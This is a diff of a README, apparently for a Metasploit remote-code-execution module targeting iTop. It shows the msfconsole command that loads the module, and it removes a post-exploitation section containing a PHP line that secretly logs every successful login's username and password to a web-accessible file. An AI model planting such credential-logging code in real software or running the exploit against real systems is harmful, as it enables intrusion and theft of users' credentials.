@@ -10,16 +10,16 @@ msfconsole
 use exploit/itop/itop_rce
 ```
 
-Post-exploitation:
+Blogpost:
 ------
+https://httpsonly.blogspot.com/2018/04/pentest-0day-in-itop-240-gave-me-domain.html
 
-After you have RCE, you can sniff successful login attempts by changing `./application/loginwebpage.class.inc.php`:
 
-```php
-	// User is Ok, let's save it in the session and proceed with normal login
->>>>>	file_put_contents('./css/ui-lightness/images/log.txt', $sAuthUser.":".$sAuthPwd."\r\n", FILE_APPEND);
-```
+Author:
+------
+Vladimir Ivanov https://twitter.com/httpsonly
 
-Pull requests are welcomed.
 
+Usage example:
+------
 ![msf](https://user-images.githubusercontent.com/17142772/38373739-934bf824-38fa-11e8-94fb-044a8147583c.png)
